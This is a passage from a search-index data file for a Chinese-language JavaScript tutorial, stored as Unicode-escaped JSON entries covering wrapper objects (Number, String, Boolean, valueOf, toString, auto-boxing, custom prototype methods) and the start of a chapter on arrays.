\u8868\u793a\u5fb7\u8bed\uff0c sv \u8868\u793a\u745e\u5178\u8bed\u3002\u5fb7\u8bed\u4e2d\uff0c \u00e4 \u5c0f\u4e8e z \uff0c\u6240\u4ee5\u8fd4\u56de -1 \uff1b\u745e\u5178\u8bed\u4e2d\uff0c \u00e4 \u5927\u4e8e z \uff0c\u6240\u4ee5\u8fd4\u56de 1 \u3002","title":"String.prototype.localeCompare()"},{"location":"stdlib/string/#_5","text":"Ariya Hidayat, JavaScript String: substring, substr, slice","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/wrapper/","text":"\u5305\u88c5\u5bf9\u8c61 \u00b6 \u5b9a\u4e49 \u00b6 \u5bf9\u8c61\u662f JavaScript \u8bed\u8a00\u6700\u4e3b\u8981\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e09\u79cd\u539f\u59cb\u7c7b\u578b\u7684\u503c\u2014\u2014\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u2014\u2014\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\uff0c\u4e5f\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u539f\u59cb\u7c7b\u578b\u7684\u201c\u5305\u88c5\u5bf9\u8c61\u201d\uff08wrapper\uff09\u3002 \u6240\u8c13\u201c\u5305\u88c5\u5bf9\u8c61\u201d\uff0c\u6307\u7684\u662f\u4e0e\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u5206\u522b\u76f8\u5bf9\u5e94\u7684 Number \u3001 String \u3001 Boolean \u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\u3002\u8fd9\u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\u53ef\u4ee5\u628a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u53d8\u6210\uff08\u5305\u88c5\u6210\uff09\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var v1 = new Number ( 123 ); var v2 = new String ( 'abc' ); var v3 = new Boolean ( true ); typeof v1 // \"object\" typeof v2 // \"object\" typeof v3 // \"object\" v1 === 123 // false v2 === 'abc' // false v3 === true // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u57fa\u4e8e\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u751f\u6210\u4e86\u4e09\u4e2a\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u3002\u53ef\u4ee5\u770b\u5230\uff0c v1 \u3001 v2 \u3001 v3 \u90fd\u662f\u5bf9\u8c61\uff0c\u4e14\u4e0e\u5bf9\u5e94\u7684\u7b80\u5355\u7c7b\u578b\u503c\u4e0d\u76f8\u7b49\u3002 \u5305\u88c5\u5bf9\u8c61\u7684\u8bbe\u8ba1\u76ee\u7684\uff0c\u9996\u5148\u662f\u4f7f\u5f97\u201c\u5bf9\u8c61\u201d\u8fd9\u79cd\u7c7b\u578b\u53ef\u4ee5\u8986\u76d6 JavaScript \u6240\u6709\u7684\u503c\uff0c\u6574\u95e8\u8bed\u8a00\u6709\u4e00\u4e2a\u901a\u7528\u7684\u6570\u636e\u6a21\u578b\uff0c\u5176\u6b21\u662f\u4f7f\u5f97\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4e5f\u6709\u529e\u6cd5\u8c03\u7528\u81ea\u5df1\u7684\u65b9\u6cd5\u3002 Number \u3001 String \u548c Boolean \u8fd9\u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\uff0c\u5982\u679c\u4e0d\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u8c03\u7528\uff08\u5373\u8c03\u7528\u65f6\u4e0d\u52a0 new \uff09\uff0c\u800c\u662f\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u8c03\u7528\uff0c\u5e38\u5e38\u7528\u4e8e\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u6570\u503c\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u3002 1 2 3 4 5 6 7 8 // \u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c Number ( '123' ) // 123 // \u6570\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32 String ( 123 ) // \"123\" // \u6570\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c Boolean ( 123 ) // true \u4e0a\u9762\u8fd9\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u8282\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8fd9\u4e09\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff08\u5e26\u6709 new \uff09\u65f6\uff0c\u53ef\u4ee5\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5bf9\u8c61\uff1b\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u4f7f\u7528\u65f6\uff08\u4e0d\u5e26\u6709 new \uff09\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \u4e09\u79cd\u5305\u88c5\u5bf9\u8c61\u5404\u81ea\u63d0\u4f9b\u4e86\u8bb8\u591a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u8be6\u89c1\u540e\u6587\u3002\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u79cd\u5b83\u4eec\u5171\u540c\u5177\u6709\u3001\u4ece Object \u5bf9\u8c61\u7ee7\u627f\u7684\u65b9\u6cd5\uff1a valueOf() \u548c toString() \u3002 valueOf() \u00b6 valueOf() \u65b9\u6cd5\u8fd4\u56de\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u5bf9\u5e94\u7684\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002 1 2 3 new Number ( 123 ). valueOf () // 123 new String ( 'abc' ). valueOf () // \"abc\" new Boolean ( true ). valueOf () // true toString() \u00b6 toString() \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 new Number ( 123 ). toString () // \"123\" new String ( 'abc' ). toString () // \"abc\" new Boolean ( true ). toString () // \"true\" \u539f\u59cb\u7c7b\u578b\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u81ea\u52a8\u8f6c\u6362 \u00b6 \u67d0\u4e9b\u573a\u5408\uff0c\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u81ea\u52a8\u5f53\u4f5c\u5305\u88c5\u5bf9\u8c61\u8c03\u7528\uff0c\u5373\u8c03\u7528\u5305\u88c5\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u65f6\uff0cJavaScript \u5f15\u64ce\u4f1a\u81ea\u52a8\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5e76\u5728\u4f7f\u7528\u540e\u7acb\u523b\u9500\u6bc1\u5b9e\u4f8b\u3002 \u6bd4\u5982\uff0c\u5b57\u7b26\u4e32\u53ef\u4ee5\u8c03\u7528 length \u5c5e\u6027\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'abc' . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c abc \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u672c\u8eab\u4e0d\u662f\u5bf9\u8c61\uff0c\u4e0d\u80fd\u8c03\u7528 length \u5c5e\u6027\u3002JavaScript \u5f15\u64ce\u81ea\u52a8\u5c06\u5176\u8f6c\u4e3a\u5305\u88c5\u5bf9\u8c61\uff0c\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u8c03\u7528 length \u5c5e\u6027\u3002\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u5c31\u4f1a\u88ab\u9500\u6bc1\u3002\u8fd9\u5c31\u53eb\u539f\u59cb\u7c7b\u578b\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u81ea\u52a8\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 var str = 'abc' ; str . length // 3 // \u7b49\u540c\u4e8e var strObj = new String ( str ) // String { // 0: \"a\", 1: \"b\", 2: \"c\", length: 3, [[PrimitiveValue]]: \"abc\" // } strObj . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 abc \u7684\u5305\u88c5\u5bf9\u8c61\u63d0\u4f9b\u4e86\u591a\u4e2a\u5c5e\u6027\uff0c length \u53ea\u662f\u5176\u4e2d\u4e4b\u4e00\u3002 \u81ea\u52a8\u8f6c\u6362\u751f\u6210\u7684\u5305\u88c5\u5bf9\u8c61\u662f\u53ea\u8bfb\u7684\uff0c\u65e0\u6cd5\u4fee\u6539\u3002\u6240\u4ee5\uff0c\u5b57\u7b26\u4e32\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u3002 1 2 3 var s = 'Hello World' ; s . x = 123 ; s . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e3a\u5b57\u7b26\u4e32 s \u6dfb\u52a0\u4e86\u4e00\u4e2a x \u5c5e\u6027\uff0c\u7ed3\u679c\u65e0\u6548\uff0c\u603b\u662f\u8fd4\u56de undefined \u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u4f1a\u81ea\u52a8\u9500\u6bc1\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4e0b\u4e00\u6b21\u8c03\u7528\u5b57\u7b26\u4e32\u7684\u5c5e\u6027\u65f6\uff0c\u5b9e\u9645\u662f\u8c03\u7528\u4e00\u4e2a\u65b0\u751f\u6210\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u751f\u6210\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u53d6\u4e0d\u5230\u8d4b\u503c\u5728\u4e0a\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u5982\u679c\u8981\u4e3a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5c5e\u6027\uff0c\u53ea\u6709\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61 String.prototype \u4e0a\u5b9a\u4e49\uff08\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\uff09\u3002 \u81ea\u5b9a\u4e49\u65b9\u6cd5 \u00b6 \u9664\u4e86\u539f\u751f\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u5305\u88c5\u5bf9\u8c61\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u4f9b\u539f\u59cb\u7c7b\u578b\u7684\u503c\u76f4\u63a5\u8c03\u7528\u3002 \u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u65b0\u589e\u4e00\u4e2a double \u65b9\u6cd5\uff0c\u4f7f\u5f97\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u7ffb\u500d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 String . prototype . double = function () { return this . valueOf () + this . valueOf (); }; 'abc' . double () // abcabc Number . prototype . double = function () { return this . valueOf () + this . valueOf (); }; ( 123 ). double () // 246 \u4e0a\u9762\u4ee3\u7801\u5728 String \u548c Number \u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u9762\uff0c\u5206\u522b\u81ea\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4ece\u800c\u53ef\u4ee5\u5728\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u8c03\u7528\u3002\u6ce8\u610f\uff0c\u6700\u540e\u4e00\u884c\u7684 123 \u5916\u9762\u5fc5\u987b\u8981\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u5426\u5219\u540e\u9762\u7684\u70b9\u8fd0\u7b97\u7b26\uff08 . \uff09\u4f1a\u88ab\u89e3\u91ca\u6210\u5c0f\u6570\u70b9\u3002","title":"\u5305\u88c5\u5bf9\u8c61"},{"location":"stdlib/wrapper/#_1","text":"","title":"\u5305\u88c5\u5bf9\u8c61"},{"location":"stdlib/wrapper/#_2","text":"\u5bf9\u8c61\u662f JavaScript \u8bed\u8a00\u6700\u4e3b\u8981\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e09\u79cd\u539f\u59cb\u7c7b\u578b\u7684\u503c\u2014\u2014\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u2014\u2014\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\uff0c\u4e5f\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u539f\u59cb\u7c7b\u578b\u7684\u201c\u5305\u88c5\u5bf9\u8c61\u201d\uff08wrapper\uff09\u3002 \u6240\u8c13\u201c\u5305\u88c5\u5bf9\u8c61\u201d\uff0c\u6307\u7684\u662f\u4e0e\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u5206\u522b\u76f8\u5bf9\u5e94\u7684 Number \u3001 String \u3001 Boolean \u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\u3002\u8fd9\u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\u53ef\u4ee5\u628a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u53d8\u6210\uff08\u5305\u88c5\u6210\uff09\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var v1 = new Number ( 123 ); var v2 = new String ( 'abc' ); var v3 = new Boolean ( true ); typeof v1 // \"object\" typeof v2 // \"object\" typeof v3 // \"object\" v1 === 123 // false v2 === 'abc' // false v3 === true // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u57fa\u4e8e\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u751f\u6210\u4e86\u4e09\u4e2a\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u3002\u53ef\u4ee5\u770b\u5230\uff0c v1 \u3001 v2 \u3001 v3 \u90fd\u662f\u5bf9\u8c61\uff0c\u4e14\u4e0e\u5bf9\u5e94\u7684\u7b80\u5355\u7c7b\u578b\u503c\u4e0d\u76f8\u7b49\u3002 \u5305\u88c5\u5bf9\u8c61\u7684\u8bbe\u8ba1\u76ee\u7684\uff0c\u9996\u5148\u662f\u4f7f\u5f97\u201c\u5bf9\u8c61\u201d\u8fd9\u79cd\u7c7b\u578b\u53ef\u4ee5\u8986\u76d6 JavaScript \u6240\u6709\u7684\u503c\uff0c\u6574\u95e8\u8bed\u8a00\u6709\u4e00\u4e2a\u901a\u7528\u7684\u6570\u636e\u6a21\u578b\uff0c\u5176\u6b21\u662f\u4f7f\u5f97\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4e5f\u6709\u529e\u6cd5\u8c03\u7528\u81ea\u5df1\u7684\u65b9\u6cd5\u3002 Number \u3001 String \u548c Boolean \u8fd9\u4e09\u4e2a\u539f\u751f\u5bf9\u8c61\uff0c\u5982\u679c\u4e0d\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u8c03\u7528\uff08\u5373\u8c03\u7528\u65f6\u4e0d\u52a0 new \uff09\uff0c\u800c\u662f\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u8c03\u7528\uff0c\u5e38\u5e38\u7528\u4e8e\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u6570\u503c\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u3002 1 2 3 4 5 6 7 8 // \u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c Number ( '123' ) // 123 // \u6570\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32 String ( 123 ) // \"123\" // \u6570\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c Boolean ( 123 ) // true \u4e0a\u9762\u8fd9\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u8282\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8fd9\u4e09\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff08\u5e26\u6709 new \uff09\u65f6\uff0c\u53ef\u4ee5\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5bf9\u8c61\uff1b\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u4f7f\u7528\u65f6\uff08\u4e0d\u5e26\u6709 new \uff09\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002","title":"\u5b9a\u4e49"},{"location":"stdlib/wrapper/#_3","text":"\u4e09\u79cd\u5305\u88c5\u5bf9\u8c61\u5404\u81ea\u63d0\u4f9b\u4e86\u8bb8\u591a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u8be6\u89c1\u540e\u6587\u3002\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u79cd\u5b83\u4eec\u5171\u540c\u5177\u6709\u3001\u4ece Object \u5bf9\u8c61\u7ee7\u627f\u7684\u65b9\u6cd5\uff1a valueOf() \u548c toString() \u3002","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/wrapper/#valueof","text":"valueOf() \u65b9\u6cd5\u8fd4\u56de\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u5bf9\u5e94\u7684\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002 1 2 3 new Number ( 123 ). valueOf () // 123 new String ( 'abc' ). valueOf () // \"abc\" new Boolean ( true ). valueOf () // true","title":"valueOf()"},{"location":"stdlib/wrapper/#tostring","text":"toString() \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 new Number ( 123 ). toString () // \"123\" new String ( 'abc' ). toString () // \"abc\" new Boolean ( true ). toString () // \"true\"","title":"toString()"},{"location":"stdlib/wrapper/#_4","text":"\u67d0\u4e9b\u573a\u5408\uff0c\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u81ea\u52a8\u5f53\u4f5c\u5305\u88c5\u5bf9\u8c61\u8c03\u7528\uff0c\u5373\u8c03\u7528\u5305\u88c5\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u65f6\uff0cJavaScript \u5f15\u64ce\u4f1a\u81ea\u52a8\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5e76\u5728\u4f7f\u7528\u540e\u7acb\u523b\u9500\u6bc1\u5b9e\u4f8b\u3002 \u6bd4\u5982\uff0c\u5b57\u7b26\u4e32\u53ef\u4ee5\u8c03\u7528 length \u5c5e\u6027\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 1 'abc' . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c abc \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u672c\u8eab\u4e0d\u662f\u5bf9\u8c61\uff0c\u4e0d\u80fd\u8c03\u7528 length \u5c5e\u6027\u3002JavaScript \u5f15\u64ce\u81ea\u52a8\u5c06\u5176\u8f6c\u4e3a\u5305\u88c5\u5bf9\u8c61\uff0c\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u8c03\u7528 length \u5c5e\u6027\u3002\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u5c31\u4f1a\u88ab\u9500\u6bc1\u3002\u8fd9\u5c31\u53eb\u539f\u59cb\u7c7b\u578b\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u81ea\u52a8\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 var str = 'abc' ; str . length // 3 // \u7b49\u540c\u4e8e var strObj = new String ( str ) // String { // 0: \"a\", 1: \"b\", 2: \"c\", length: 3, [[PrimitiveValue]]: \"abc\" // } strObj . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 abc \u7684\u5305\u88c5\u5bf9\u8c61\u63d0\u4f9b\u4e86\u591a\u4e2a\u5c5e\u6027\uff0c length \u53ea\u662f\u5176\u4e2d\u4e4b\u4e00\u3002 \u81ea\u52a8\u8f6c\u6362\u751f\u6210\u7684\u5305\u88c5\u5bf9\u8c61\u662f\u53ea\u8bfb\u7684\uff0c\u65e0\u6cd5\u4fee\u6539\u3002\u6240\u4ee5\uff0c\u5b57\u7b26\u4e32\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u3002 1 2 3 var s = 'Hello World' ; s . x = 123 ; s . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e3a\u5b57\u7b26\u4e32 s \u6dfb\u52a0\u4e86\u4e00\u4e2a x \u5c5e\u6027\uff0c\u7ed3\u679c\u65e0\u6548\uff0c\u603b\u662f\u8fd4\u56de undefined \u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u4f1a\u81ea\u52a8\u9500\u6bc1\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4e0b\u4e00\u6b21\u8c03\u7528\u5b57\u7b26\u4e32\u7684\u5c5e\u6027\u65f6\uff0c\u5b9e\u9645\u662f\u8c03\u7528\u4e00\u4e2a\u65b0\u751f\u6210\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u751f\u6210\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u53d6\u4e0d\u5230\u8d4b\u503c\u5728\u4e0a\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u5982\u679c\u8981\u4e3a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5c5e\u6027\uff0c\u53ea\u6709\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61 String.prototype \u4e0a\u5b9a\u4e49\uff08\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\uff09\u3002","title":"\u539f\u59cb\u7c7b\u578b\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u81ea\u52a8\u8f6c\u6362"},{"location":"stdlib/wrapper/#_5","text":"\u9664\u4e86\u539f\u751f\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u5305\u88c5\u5bf9\u8c61\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u4f9b\u539f\u59cb\u7c7b\u578b\u7684\u503c\u76f4\u63a5\u8c03\u7528\u3002 \u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u65b0\u589e\u4e00\u4e2a double \u65b9\u6cd5\uff0c\u4f7f\u5f97\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u7ffb\u500d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 String . prototype . double = function () { return this . valueOf () + this . valueOf (); }; 'abc' . double () // abcabc Number . prototype . double = function () { return this . valueOf () + this . valueOf (); }; ( 123 ). double () // 246 \u4e0a\u9762\u4ee3\u7801\u5728 String \u548c Number \u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u9762\uff0c\u5206\u522b\u81ea\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4ece\u800c\u53ef\u4ee5\u5728\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u8c03\u7528\u3002\u6ce8\u610f\uff0c\u6700\u540e\u4e00\u884c\u7684 123 \u5916\u9762\u5fc5\u987b\u8981\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u5426\u5219\u540e\u9762\u7684\u70b9\u8fd0\u7b97\u7b26\uff08 . \uff09\u4f1a\u88ab\u89e3\u91ca\u6210\u5c0f\u6570\u70b9\u3002","title":"\u81ea\u5b9a\u4e49\u65b9\u6cd5"},{"location":"types/array/","text":"\u6570\u7ec4 \u00b6 \u5b9a\u4e49 \u00b6 \u6570\u7ec4\uff08array\uff09\u662f\u6309\u6b21\u5e8f\u6392\u5217\u7684\u4e00\u7ec4\u503c\u3002\u6bcf\u4e2a\u503c\u7684\u4f4d\u7f6e\u90fd\u6709\u7f16\u53f7\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u6574\u4e2a\u6570\u7ec4\u7528\u65b9\u62ec\u53f7\u8868\u793a\u3002 1 var arr = [ 'a' , 'b' , 'c' ]; \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 a \u3001 b \u3001 c \u5c31\u6784\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u4e24\u7aef\u7684\u65b9\u62ec\u53f7\u662f\u6570\u7ec4\u7684\u6807\u5fd7\u3002 a \u662f0\u53f7\u4f4d\u7f6e\uff0c b \u662f1\u53f7\u4f4d\u7f6e\uff0c c \u662f2\u53f7\u4f4d\u7f6e\u3002 \u9664\u4e86\u5728\u5b9a\u4e49\u65f6\u8d4b\u503c\uff0c\u6570\u7ec4\u4e5f\u53ef\u4ee5\u5148\u5b9a\u4e49\u540e\u8d4b\u503c\u3002 1 2 3 4 5 var arr = []; arr [ 0 ] = 'a' ; arr [ 1 ] = 'b' ; arr [ 2 ] = 'c' ; \u4efb\u4f55\u7c7b\u578b\u7684\u6570\u636e\uff0c\u90fd\u53ef\u4ee5\u653e\u5165\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 9 var arr = [ { a : 1 }, [ 1 , 2 , 3 ], function () { return true ;} ]; arr [ 0 ] // Object {a: 1} arr [ 1 ] // [1, 2, 3] arr [ 2 ] // function (){return true;} \u4e0a\u9762\u6570\u7ec4 arr \u76843\u4e2a\u6210\u5458\u4f9d\u6b21\u662f\u5bf9\u8c61\u3001\u6570\u7ec4\u3001\u51fd\u6570\u3002 \u5982\u679c\u6570\u7ec4\u7684\u5143\u7d20\u8fd8\u662f\u6570\u7ec4\uff0c\u5c31\u5f62\u6210\u4e86\u591a\u7ef4\u6570\u7ec4\u3002 1 2 3 var a = [[ 1 , 2 ], [ 3 , 4 ]]; a [ 0 ][ 1 ] // 2 a [ 1 ][ 1 ] // 4 \u6570\u7ec4\u7684\u672c\u8d28 \u00b6 \u672c\u8d28\u4e0a\uff0c\u6570\u7ec4\u5c5e\u4e8e\u4e00\u79cd\u7279\u6b8a\u7684\u5bf9\u8c61\u3002 typeof \u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de\u6570\u7ec4\u7684\u7c7b\u578b\u662f object \u3002 1 typeof [ 1 , 2 , 3 ] // \"object\" \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c typeof \u8fd0\u7b97\u7b26\u8ba4\u4e3a\u6570\u7ec4\u7684\u7c7b\u578b\u5c31\u662f\u5bf9\u8c61\u3002 \u6570\u7ec4\u7684\u7279\u6b8a\u6027\u4f53\u73b0\u5728\uff0c\u5b83\u7684\u952e\u540d\u662f\u6309\u6b21\u5e8f\u6392\u5217\u7684\u4e00\u7ec4\u6574\u6570\uff080\uff0c1\uff0c2...\uff09\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; Object . keys ( arr ) // [\"0\", \"1\", \"2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.keys \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u7684\u6240\u6709\u952e\u540d\u3002\u53ef\u4ee5\u770b\u5230\u6570\u7ec4\u7684\u952e\u540d\u5c31\u662f\u6574\u65700\u30011\u30012\u3002 \u7531\u4e8e\u6570\u7ec4\u6210\u5458\u7684\u952e\u540d\u662f\u56fa\u5b9a\u7684\uff08\u9ed8\u8ba4\u603b\u662f0\u30011\u30012...\uff09\uff0c\u56e0\u6b64\u6570\u7ec4\u4e0d\u7528\u4e3a\u6bcf\u4e2a\u5143\u7d20\u6307\u5b9a\u952e\u540d\uff0c\u800c\u5bf9\u8c61\u7684\u6bcf\u4e2a\u6210\u5458\u90fd\u5fc5\u987b\u6307\u5b9a\u952e\u540d\u3002JavaScript 